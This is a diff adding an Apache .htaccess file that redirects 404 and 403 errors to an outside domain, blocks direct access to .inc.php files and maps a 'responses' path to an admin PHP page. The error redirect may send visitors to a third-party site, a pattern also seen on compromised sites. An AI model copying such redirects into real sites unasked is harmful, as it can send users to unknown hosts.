@@ -1,0 +1,10 @@
+ErrorDocument 404 https://www.0r4v3c.xyz/
+ErrorDocument 403 https://www.0r4v3c.xyz/
+
+<Files ~ "\.inc.php$">
+    Order allow,deny
+    Deny from all
+</Files>
+
+RewriteEngine on
+RewriteRule "^responses$" "responses.admin.php"
